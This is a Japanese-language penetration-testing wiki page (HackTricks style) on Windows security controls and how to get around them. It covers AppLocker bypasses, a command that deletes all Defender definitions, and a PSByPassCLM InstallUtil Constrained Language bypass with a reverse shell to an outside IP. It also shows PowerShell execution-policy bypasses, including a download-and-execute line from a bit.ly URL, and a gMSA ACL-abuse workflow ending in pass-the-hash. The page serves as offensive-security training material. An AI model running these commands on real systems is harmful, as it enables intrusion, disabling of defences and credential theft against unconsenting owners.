# Windows Security Controls

{{#include ../../banners/hacktricks-training.md}}

## AppLocker ポリシー

アプリケーションの許可リストとは、システム上に存在し、実行することが許可された承認済みのソフトウェアアプリケーションまたは実行可能ファイルの一覧です。目的は、組織固有のビジネスニーズに合致しない有害なマルウェアや未承認のソフトウェアから環境を保護することです。

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) は Microsoft の **application whitelisting solution** であり、システム管理者が **ユーザーによる実行を許可するアプリケーションとファイルを制御**できるようにします。実行可能ファイル、スクリプト、Windows installer ファイル、DLL、パッケージ化されたアプリ、パッケージ化されたアプリの installer に対する **きめ細かな制御**を提供します。\
組織では **cmd.exe と PowerShell.exe をブロック**し、特定のディレクトリへの書き込みアクセスを制限することが一般的ですが、**これらはすべて bypass 可能です**。

### 確認

ブラックリストまたはホワイトリストに登録されているファイル／拡張子を確認します：
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
このレジストリ パスには、AppLocker によって適用される構成とポリシーが含まれており、システム上で現在適用されているルールを確認できます。

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy を bypass するために有用な **Writable folders**: AppLocker が `C:\Windows\System32` または `C:\Windows` 内の任意のものの実行を許可している場合、これを **bypass** するために使用できる **writable folders** があります。
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- 一般的に **trusted** な [**"LOLBAS's"**](https://lolbas-project.github.io/) バイナリも、AppLocker の bypass に利用できます。
- **不適切に記述されたルールも bypass できる可能性があります**
- 例えば **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** の場合、どこにでも **`allowed` という名前のフォルダーを作成**でき、許可されます。
- 組織では、**`%System32%\WindowsPowerShell\v1.0\powershell.exe` 実行ファイルのブロック**に注力することがよくありますが、**その他の** [**PowerShell executable locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations)、例えば `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` や `PowerShell_ISE.exe` を忘れがちです。
- システムにかかる追加の負荷や、何も壊れないことを確認するために必要なテスト量が原因で、**DLL enforcement が有効化されることは非常にまれです**。そのため、**DLL を backdoor として使用すると AppLocker の bypass に役立ちます**。
- [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) または [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) を使用すると、任意のプロセス内で **Powershell** code を **execute** し、AppLocker を bypass できます。詳細については、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode) を確認してください。<sup>[[4]](#references)</sup>

## 認証情報の保存

### Security Accounts Manager (SAM)

ローカルの認証情報はこのファイルに存在し、passwords は hash 化されています。

### Local Security Authority (LSA) - LSASS

Single Sign-On のため、この subsystem の **memory** 内に **credentials**（hashed）が **保存**されています。\
**LSA** は、ローカルの **security policy**（password policy、users permissions など）、**authentication**、**access tokens** などを管理します。\
LSA は、提供された credentials を **SAM** file 内で **check**（ローカル login の場合）し、**domain controller** と **talk** して domain user を authentication する役割を担います。

**credentials** は **process LSASS** 内に **保存**されています。Kerberos tickets、NT および LM hashes、簡単に decrypted できる passwords などです。

### LSA secrets

LSA は一部の credentials を disk に保存することがあります。

- Active Directory の computer account の password（到達不能な domain controller）。
- Windows services の accounts の passwords
- scheduled tasks の passwords
- その他（IIS applications の password など）

### NTDS.dit

Active Directory の database です。Domain Controllers にのみ存在します。

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) は、Windows 10 および Windows 11、さらに Windows Server の各バージョンで利用できる Antivirus です。**`WinPEAS`** などの一般的な pentesting tools を **blocks** します。ただし、これらの **protections を bypass** する方法があります。

### Check

**Defender** の **status** を確認するには、PS cmdlet **`Get-MpComputerStatus`** を **execute** します（有効かどうかを確認するには **`RealTimeProtectionEnabled`** の値を確認します）。

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

enumerate するには、次のコマンドも実行できます。
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## 暗号化ファイル システム (EFS)

EFS は、**File Encryption Key (FEK)** と呼ばれる**対称鍵**を使用してファイルを暗号化し、ファイルを保護します。この鍵はユーザーの**公開鍵**で暗号化され、暗号化されたファイルの $EFS **代替データ ストリーム**内に保存されます。復号が必要な場合は、ユーザーのデジタル証明書に対応する**秘密鍵**を使用して、$EFS ストリームから FEK を復号します。詳細については[こちら](https://en.wikipedia.org/wiki/Encrypting_File_System)を参照してください。

**ユーザーの操作なしで復号されるシナリオ**には、次のようなものがあります。

- ファイルまたはフォルダーが [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) のような EFS 非対応ファイル システムに移動されると、自動的に復号されます。
- SMB/CIFS プロトコル経由でネットワーク上に送信される暗号化ファイルは、送信前に復号されます。

この暗号化方式により、所有者は暗号化されたファイルに**透過的にアクセス**できます。ただし、所有者のパスワードを変更してログインするだけでは、復号できません。

**主なポイント**:

- EFS は対称 FEK を使用し、ユーザーの公開鍵で暗号化します。
- 復号では、ユーザーの秘密鍵を使用して FEK にアクセスします。
- FAT32 へのコピーやネットワーク送信など、特定の条件下では自動的に復号されます。
- 暗号化されたファイルには、所有者が追加の操作なしでアクセスできます。

### EFS 情報の確認

**ユーザー**がこの**サービスを使用したことがあるか**を、次のパスが存在するか確認して調べます:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

cipher /c \<file\> を使用して、そのファイルに**アクセスできるユーザー**を確認します\
フォルダー内で `cipher /e` と `cipher /d` を使用して、すべてのファイルを**暗号化**および**復号**することもできます

### EFS ファイルの復号

#### Authority System になる

この方法では、ホスト内で**victim user**が**プロセスを実行中**である必要があります。その場合、`meterpreter` セッションを使用して、ユーザーのプロセスのトークン（`incognito` の `impersonate_token`）を偽装できます。または、ユーザーのプロセスへ `migrate` することもできます。

#### ユーザーのパスワードを知っている場合


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft は、IT インフラストラクチャにおける service accounts の管理を簡素化するために、**Group Managed Service Accounts (gMSA)** を開発しました。「**Password never expire**」設定が有効になっていることが多い従来の service accounts とは異なり、gMSA はより安全で管理しやすいソリューションを提供します。

- **Automatic Password Management**: gMSA は、ドメインまたはコンピューターのポリシーに従って自動的に変更される、240 文字の複雑なパスワードを使用します。この処理は Microsoft の Key Distribution Service (KDC) によって行われるため、手動でパスワードを更新する必要がありません。
- **Enhanced Security**: これらのアカウントはロックアウトの影響を受けず、インタラクティブ ログインにも使用できないため、セキュリティが向上します。
- **Multiple Host Support**: gMSA は複数のホスト間で共有できるため、複数のサーバー上で実行されるサービスに適しています。
- **Scheduled Task Capability**: managed service accounts とは異なり、gMSA は scheduled tasks の実行をサポートします。
- **Simplified SPN Management**: コンピューターの sAMaccount の詳細または DNS 名に変更があると、システムが Service Principal Name (SPN) を自動的に更新するため、SPN の管理が簡素化されます。

gMSA のパスワードは LDAP プロパティ _**msDS-ManagedPassword**_ に保存され、Domain Controllers (DCs) によって 30 日ごとに自動的にリセットされます。このパスワードは、[MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) として知られる暗号化されたデータ blob であり、承認された管理者と、gMSA がインストールされているサーバーのみが取得できます。これにより、安全な環境が確保されます。この情報にアクセスするには、LDAPS などの secure connection が必要であるか、接続が 'Sealing & Secure' で認証されている必要があります。

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

[**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup> を使用して、このパスワードを読み取ることができます。
```
/GMSAPasswordReader --AccountName jkohler
```
[**この投稿で詳細を確認**](https://cube0x0.github.io/Relaying-for-gMSA/)

また、**gMSA** の **password** を **read** するために **NTLM relay attack** を実行する方法については、この [web page](https://cube0x0.github.io/Relaying-for-gMSA/) も確認してください。<sup>[[1]](#references)</sup>

### ACL chaining を悪用して gMSA managed password を read する（GenericAll -> ReadGMSAPassword）

多くの環境では、設定ミスのある object ACL を悪用することで、低権限ユーザーが DC compromise なしに gMSA secrets へ pivot できます。<sup>[[3]](#references)</sup>

- 自分が control できる group（例：GenericAll/GenericWrite 経由）に、gMSA に対する `ReadGMSAPassword` が付与されている。
- その group に自分を追加することで、LDAP 経由で gMSA の `msDS-ManagedPassword` blob を read し、利用可能な NTLM credentials を導出する権限を継承する。

Typical workflow:

1) BloodHound で path を discover し、自分の foothold principals を Owned として mark します。次のような edge を探します。
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) 自分が control している intermediate group に自分を追加します（bloodyAD の例）。
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) LDAP経由でgMSAの管理パスワードを読み取り、NTLM hashを導出します。NetExecは`msDS-ManagedPassword`の抽出とNTLMへの変換を自動化します。
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) NTLM hashを使用してgMSAとしてAuthenticateする（plaintextは不要）。アカウントがRemote Management Usersに所属している場合、WinRMは直接動作する：
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
注:
- `msDS-ManagedPassword` の LDAP reads には sealing（例: LDAPS/sign+seal）が必要です。Tools がこれを自動的に処理します。
- gMSA には、WinRM などの local rights が付与されていることが多いため、lateral movement を計画する際は group membership（例: Remote Management Users）を確認してください。
- blob を取得して NTLM を自分で計算するだけでよい場合は、MSDS-MANAGEDPASSWORD_BLOB structure を参照してください。



## LAPS

[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) から download できる **Local Administrator Password Solution (LAPS)** は、local Administrator passwords の管理を可能にします。これらの passwords は **randomized** で、各環境に固有の値が設定され、**定期的に変更**され、Active Directory に中央で保存されます。これらの passwords への access は、authorized users に ACLs で制限されています。十分な permissions が付与されている場合、local admin passwords を read できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell の [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) は、PowerShell を効果的に使用するために必要な多くの features を **ロックダウン**します。これには、COM objects の block、approved .NET types のみの許可、XAML-based workflows、PowerShell classes などが含まれます。

### **Check**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
現在の Windows ではその Bypass は動作しませんが、[ **PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) を使用できます。\
**コンパイルするには必要になる場合があります** **:** _**参照の追加**_ -> _参照_ ->_参照_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` を追加し、**プロジェクトを .Net4.5 に変更**します。

#### 直接 bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) または [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) を使用すると、任意のプロセス内で **Powershell** コードを **execute** し、constrained mode を bypass できます。詳細については、[https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode) を参照してください。<sup>[[4]](#references)</sup>

## PS Execution Policy

デフォルトでは **restricted** に設定されています。このポリシーを bypass する主な方法:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
詳細はこちら](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup>

## Security Support Provider Interface (SSPI)

ユーザーの認証に使用できる API です。

SSPI は、通信を行おうとする 2 台のマシンに適したプロトコルを見つける役割を担います。このための優先メソッドは Kerberos です。その後、SSPI は使用する認証プロトコルをネゴシエートします。これらの認証プロトコルは Security Support Provider (SSP) と呼ばれ、各 Windows マシン内に DLL として配置されています。通信するには、両方のマシンが同じ SSP をサポートしている必要があります。

### Main SSPs

- **Kerberos**: 優先される SSP
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** および **NTLMv2**: 互換性上の理由
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web サーバーおよび LDAP、パスワードは MD5 hash の形式
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL および TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: 使用するプロトコルをネゴシエートするために使用されます（Kerberos または NTLM。デフォルトは Kerberos）
- %windir%\Windows\System32\lsasrv.dll

#### ネゴシエーションでは、複数のメソッドまたは 1 つだけのメソッドが提示される場合があります。

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) は、**昇格されたアクティビティに対する同意プロンプト**を有効にする機能です。


{{#ref}}
uac-user-account-control.md
{{#endref}}

## 参考文献

- [1] [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: 権限の chaining による WinRM 経由の gMSA](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – AppLocker および PowerShell Constrained Language Mode の Bypassing](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [5] [NetSPI – PowerShell Execution Policy を Bypass する 15 の方法](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ EFS files を decrypt する](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)

{{#include ../../banners/hacktricks-training.md}}
